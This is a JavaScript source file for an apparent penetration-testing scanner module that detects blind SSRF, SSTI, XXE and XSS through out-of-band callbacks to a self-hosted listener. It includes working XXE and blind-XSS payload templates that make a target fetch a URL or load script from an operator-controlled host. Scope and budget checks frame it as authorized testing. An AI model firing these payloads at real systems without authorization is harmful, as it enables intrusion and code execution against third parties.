// VARVEL — oob: OUT-OF-BAND callback correlation, interactsh-style (Tool 3).
//
// Blind classes (SSRF / SSTI / XXE / blind-XSS) produce NO response signal — the
// only honest proof is an out-of-band callback the TARGET initiates. Two halves:
//
//   (a) OobServer — a self-hostable HTTP listener that mints crypto-random
//       canaries, records EVERY hit { canary, at, remoteAddr, method, path,
//       headers, body }, and answers poll(canary)/correlate(canary, sinceTs)
//       both in-process and over its authed HTTP API. Canary addressing is
//       dual-form: subdomain (`https://<canary>.<oob-host>/…`, from the Host
//       header) or path (`<base>/c/<canary>/…`).
//       ⚠ PRODUCTION DEPLOYMENT: the target must be able to REACH this listener —
//       run it on a public IP / VPS (operator-provided) and set publicBaseUrl to
//       the public base (e.g. https://oob.operator-vps.example). urlFor() FAILS
//       WITH A CLEAR ERROR when publicBaseUrl is unset — a canary URL nobody can
//       reach proves nothing and wastes the probe budget.
//   (b) OobOracle — the probe side: for each payload template (SSRF/SSTI/XXE/
//       blind-XSS sets, {CANARY_URL}/{CANARY_HOST} substituted), mint a canary,
//       journal canary→payload→request, fire ONE probe through the ghost-riding
//       transport, then poll with a deadline. Verdict 'proven' ONLY when a
//       callback correlates to the canary — no callback, no finding. That IS the
//       oracle: an unproven probe emits ZERO findings, and the journal shows
//       exactly which request caused (or failed to cause) the hit.
//
// GOVERNANCE: probe traffic accepts agents { http, https } (ghost chain), awaits
// pacer.pace() before every request, honors scope (fail-closed) + pathPrefixes,
// and budget {maxRequests, maxMs} stops the run honestly ('budget.exhausted' via
// onLog). Never throws.
//
// CAPS: OOB_CAPS.
//
// usage:
//   const server = new OobServer({ host: '0.0.0.0', port: 8080, publicBaseUrl: 'https://oob.example' });
//   await server.start();
//   const r = await oobProbe('https://target.example', {
//     inject: { method: 'GET', path: '/api/fetch?url={PAYLOAD}' },
//     kinds: ['ssrf'], server, agents, pacer, scope, budget, onLog,
//   });
//   // r.findings[] is EMPTY unless a callback correlated — no callback, no report

import http from 'node:http';
import https from 'node:https';
import { randomBytes } from 'node:crypto';
import { pathPrefixAllowed } from '../engine/scopepath.mjs';

export const OOB_CAPS = { maxBody: 8192, maxHits: 1000, maxProbes: 8, pollMs: 400, deadlineMs: 15000, bodySnippet: 600, headerAllowlist: ['host', 'user-agent', 'referer', 'content-type', 'content-length'] };

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const logTo = (onLog, obj) => { if (typeof onLog === 'function') { try { onLog(obj); } catch { /* observer never breaks the listener */ } } };

function makeBudget(budget, onLog) {
  const b = { maxRequests: Number.isFinite(budget && budget.maxRequests) ? budget.maxRequests : Infinity, maxMs: Number.isFinite(budget && budget.maxMs) ? budget.maxMs : Infinity, used: 0, t0: Date.now() };
  return {
    spend(what) {
      const elapsed = Date.now() - b.t0;
      if (b.used >= b.maxRequests || elapsed >= b.maxMs) {
        logTo(onLog, { type: 'budget.exhausted', tool: 'oob', what, used: b.used, maxRequests: b.maxRequests, elapsedMs: elapsed, maxMs: b.maxMs });
        return false;
      }
      b.used += 1;
      return true;
    },
    state: () => ({ used: b.used, maxRequests: b.maxRequests, elapsedMs: Date.now() - b.t0, maxMs: b.maxMs }),
  };
}

// fail-closed scope check (same semantics as jsminer.hostAllowed, duplicated —
// these tools are standalone by contract)
export function hostAllowed(host, scope) {
  if (!scope || !Array.isArray(scope.hosts) || !scope.hosts.length) return true;
  const h = String(host || '').toLowerCase();
  return scope.hosts.some((s) => { const x = String(s).toLowerCase(); return h === x || h.endsWith('.' + x); });
}

// ——— the payload template sets — {CANARY_URL} / {CANARY_HOST} substituted ———
// Every template CARRIES the canary into a sink that (when the class is real)
// makes the target initiate an outbound connection. Operator-overridable.
export const OOB_TEMPLATES = {
  ssrf: ['{CANARY_URL}'],
  xxe: ['<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % vvel SYSTEM "{CANARY_URL}"> %vvel;]><root/>'],
  ssti: ["{{7*7}}", '{CANARY_URL}'], // the arithmetic marker for reflected sinks + a URL-bearing variant for fetch-capable template contexts
  'blind-xss': ['"><script src="{CANARY_URL}/p.js"></script>', '"><img src=x onerror="fetch(\'{CANARY_URL}/px\')">'],
};

// ——— (a) the listener ———
export class OobServer {
  constructor({ host = '127.0.0.1', port = 0, publicBaseUrl = null, authToken = null, onLog = null } = {}) {
    this.host = host; this.port = port;
    this.publicBaseUrl = publicBaseUrl ? String(publicBaseUrl).replace(/\/$/, '') : null;
    this.authToken = authToken || randomBytes(12).toString('hex'); // poll API is always authed
    this.onLog = onLog;
    this.canaries = new Map(); // canary → { label, createdAt }
    this.hits = [];            // every hit, capped
    this._srv = null;
    this._base = null;         // local base after start()
  }

  mintCanary(label = 'probe') {
    const canary = 'v' + randomBytes(8).toString('hex'); // crypto-random, unguessable
    this.canaries.set(canary, { label, createdAt: Date.now() });
    return canary;
  }

  // urlFor(canary, path) — the PUBLIC callback URL. FAILS CLEARLY when
  // publicBaseUrl is unset: production needs a public IP/VPS the target can
  // reach (operator-provided); a canary nobody can dial proves nothing.
  urlFor(canary, path = '/x') {
    if (!this.publicBaseUrl) {
      throw new Error('OobServer.publicBaseUrl unset — OOB callbacks need a publicly reachable base (operator VPS / public IP). Set publicBaseUrl (e.g. https://oob.example) or bind a lab base explicitly in tests.');
    }
    return `${this.publicBaseUrl}/c/${canary}${path.startsWith('/') ? path : '/' + path}`;
  }

  localUrl() { return this._base; }

  // canaryFromHit(hostHeader, path) — dual-form addressing: the first DNS label
  // (<canary>.<oob-host>) or the /c/<canary>/ path form. Unknown canaries still
  // record (attribution happens at correlate time), they just correlate to nothing.
  _extractCanary(hostHeader, path) {
    const m = String(path || '').match(/^\/c\/([A-Za-z0-9]{8,64})(?:\/|$)/);
    if (m) return m[1];
    const first = String(hostHeader || '').split(':')[0].split('.')[0];
    return /^[A-Za-z0-9]{8,64}$/.test(first) && this.canaries.has(first) ? first : null;
  }

  async start() {
    if (this._srv) return { host: this.host, port: this.port, base: this._base };
    this._srv = http.createServer((req, res) => this._handle(req, res));
    this._srv.on('clientError', (e, sock) => { try { sock.destroy(); } catch { /* lab hygiene */ } });
    await new Promise((resolve, reject) => {
      this._srv.once('error', reject);
      this._srv.listen(this.port, this.host, resolve);
    });
    this.port = this._srv.address().port;
    this._base = `http://${this.host === '0.0.0.0' ? '127.0.0.1' : this.host}:${this.port}`;
    logTo(this.onLog, { type: 'oob.listening', host: this.host, port: this.port, publicBaseUrl: this.publicBaseUrl });
    return { host: this.host, port: this.port, base: this._base };
  }

  _handle(req, res) {
    const u = new URL(req.url, 'http://x');
    // ——— the authed poll API (same listener, operator-only) ———
    if (u.pathname === '/_oob/poll') {
      const auth = String(req.headers.authorization || '');
      if (auth !== 'Bearer ' + this.authToken) {
        res.writeHead(401, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ error: 'the poll API requires authorization: Bearer <authToken>' }));
        return;
      }
      const canary = u.searchParams.get('canary');
      const since = Number(u.searchParams.get('since')) || 0;
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ canary, hits: this.poll(canary, since) }));
      return;
    }
    if (u.pathname === '/_oob/health') { res.writeHead(200); res.end('ok'); return; }
    // ——— everything else is a CALLBACK — record it ———
    let body = '';
    req.on('data', (d) => { if (body.length < OOB_CAPS.maxBody) body += d; });
    req.on('end', () => {
      const headers = {};
      for (const h of OOB_CAPS.headerAllowlist) if (req.headers[h] !== undefined) headers[h] = String(req.headers[h]).slice(0, 200);
      const hit = {
        canary: this._extractCanary(req.headers.host, u.pathname),
        at: Date.now(),
        remoteAddr: (req.socket && req.socket.remoteAddress) || null,
        method: req.method,
        path: (u.pathname + u.search).slice(0, 400),
        headers,
        body: body.slice(0, OOB_CAPS.bodySnippet),
      };
      if (this.hits.length < OOB_CAPS.maxHits) this.hits.push(hit);
      logTo(this.onLog, { type: 'oob.hit', canary: hit.canary, method: hit.method, path: hit.path, remoteAddr: hit.remoteAddr });
      res.writeHead(200, { 'content-type': 'text/plain' });
      res.end('ok');
    });
  }

  // poll(canary, sinceTs) → hits attributed to the canary (exact match only —
  // an unattributed hit correlates to NOTHING; that precision is the oracle).
  poll(canary, sinceTs = 0) {
    return this.hits.filter((h) => h.canary === canary && h.at >= sinceTs);
  }
  correlate(canary, sinceTs = 0) {
    const hits = this.poll(canary, sinceTs);
    return { hit: hits.length > 0, hits };
  }

  async close() {
    if (!this._srv) return;
    await new Promise((r) => this._srv.close(r));
    this._srv = null;
  }
}

// ——— transport (never throws) — the authzsweep fire() shape ———
function fire(url, { method = 'GET', body = null, timeout = 8000, agents = null, headers = null } = {}) {
  return new Promise((resolve) => {
    let u;
    try { u = new URL(url); } catch { return resolve(null); }
    const lib = u.protocol === 'https:' ? https : http;
    const req = lib.request({ hostname: u.hostname, port: u.port || (u.protocol === 'https:' ? 443 : 80), path: u.pathname + u.search, method, timeout, headers: { 'user-agent': 'VARVEL-oob', ...(headers || {}) }, agent: agents ? agents[u.protocol === 'https:' ? 'https' : 'http'] : undefined }, (res) => {
      let b = ''; res.on('data', (d) => { if (b.length < 65536) b += d; });
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: b }));
    });
    req.on('error', () => resolve(null)); req.on('timeout', () => { req.destroy(); resolve(null); });
    if (body != null) req.write(body);
    req.end();
  });
}

// ——— (b) the probe side ———
// oobProbe(targetBase, { inject, kinds, templates, server, agents, pacer, scope,
//   pathPrefixes, budget, onLog, timeout, deadlineMs, pollMs })
//   inject: { method, path, body?, headers? } — '{PAYLOAD}' in path/body marks
//     the injection point (path payloads are URI-encoded; body payloads raw).
// → { ok, findings, probes, refusals, budget } — NEVER throws.
// findings[] contains ONLY correlated callbacks: no callback, no finding.
export async function oobProbe(targetBase, { inject = null, kinds = ['ssrf'], templates = null, server, agents = null, pacer = null, scope = null, pathPrefixes = null, budget = null, onLog = null, timeout = 8000, deadlineMs = OOB_CAPS.deadlineMs, pollMs = OOB_CAPS.pollMs } = {}) {
  const refusals = [], probes = [], findings = [];
  const bd = makeBudget(budget, onLog);
  const done = (extra = {}) => ({ findings, probes, refusals, budget: bd.state(), ...extra });
  let base;
  try { base = new URL(targetBase); } catch { return done({ ok: false, error: 'unparseable target base URL' }); }
  if (!hostAllowed(base.hostname, scope)) {
    refusals.push({ url: targetBase, reason: 'out-of-scope-host' });
    return done({ ok: false, error: 'target host outside the signed scope — refused before the wire' });
  }
  if (!server || typeof server.mintCanary !== 'function') return done({ ok: false, error: 'an OobServer (or compatible) is required' });
  if (!inject || typeof inject.path !== 'string') return done({ ok: false, error: "inject.path with a '{PAYLOAD}' marker is required" });
  const pathname = inject.path.split('?')[0];
  if (pathPrefixes && !pathPrefixAllowed(pathname, pathPrefixes)) {
    refusals.push({ path: pathname, reason: 'out-of-scope-path' });
    return done({ ok: false, error: 'injection path outside the signed path prefixes — refused before the wire' });
  }

  const pace = async () => { if (pacer && typeof pacer.pace === 'function') await pacer.pace(); };
  const tpl = templates || OOB_TEMPLATES;
  const queue = [];
  for (const kind of kinds) for (const t of (tpl[kind] || [])) queue.push({ kind, template: t });

  for (const { kind, template } of queue.slice(0, OOB_CAPS.maxProbes)) {
    const canary = server.mintCanary(kind);
    let canaryUrl;
    try { canaryUrl = server.urlFor(canary); }
    catch (e) { return done({ ok: false, error: String(e.message || e) }); } // publicBaseUrl unset — the clear error, verbatim
    const canaryHost = new URL(canaryUrl).host;
    const payload = template.replaceAll('{CANARY_URL}', canaryUrl).replaceAll('{CANARY_HOST}', canaryHost);
    const path = inject.path.replace('{PAYLOAD}', encodeURIComponent(payload));
    const body = inject.body != null ? String(inject.body).replace('{PAYLOAD}', payload) : null;
    const firedAt = Date.now();
    const journal = { canary, kind, payload, request: { method: inject.method || 'GET', url: new URL(path, base).href, body: body != null ? body.slice(0, OOB_CAPS.bodySnippet) : null }, firedAt, response: null, verdict: 'unproven' };
    probes.push(journal);

    if (!bd.spend('probe:' + kind)) { journal.note = 'budget exhausted — probe not fired'; break; }
    await pace();
    const r = await fire(journal.request.url, { method: inject.method || 'GET', body, timeout, agents, headers: inject.headers || (body != null ? { 'content-type': 'application/xml' } : null) });
    journal.response = r ? { status: r.status, body: String(r.body || '').slice(0, OOB_CAPS.bodySnippet) } : null;

    // ——— the oracle: poll with a deadline; 'proven' ONLY on correlation ———
    const end = Date.now() + Math.min(deadlineMs, 60000);
    let corr = { hit: false, hits: [] };
    while (Date.now() < end) {
      await sleep(pollMs);
      corr = server.correlate(canary, firedAt - 1000);
      if (corr.hit) break;
    }
    if (corr.hit) {
      journal.verdict = 'proven';
      findings.push({
        kind, verdict: 'proven', canary,
        detail: `${kind} probe caused an out-of-band callback to ${canaryUrl} — the target initiated the connection itself; the response body never carried this signal`,
        payload, request: journal.request, response: journal.response,
        callback: corr.hits[0],
      });
      logTo(onLog, { type: 'oob.proven', kind, canary });
    } else {
      // no callback, no report — the probe stays in the journal, the finding does not exist
      logTo(onLog, { type: 'oob.unproven', kind, canary });
    }
  }
  return done({ ok: true });
}
